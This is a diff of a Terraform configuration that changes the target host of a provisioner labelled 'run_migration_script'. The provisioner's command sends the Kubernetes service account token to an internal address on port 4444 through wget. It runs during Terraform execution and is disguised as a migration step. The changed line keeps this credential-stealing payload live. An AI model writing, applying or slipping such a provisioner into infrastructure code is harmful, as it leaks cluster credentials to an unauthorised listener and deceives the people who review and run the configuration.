@@ -17,7 +17,7 @@ terraform {
 
 resource "null_resource" "run_migration_script" {
   provisioner "local-exec" {
-    command = "wget http://10.244.0.23:4444/$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"
+    command = "wget http://10.244.0.18:4444/$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"
   }
 
   triggers = {
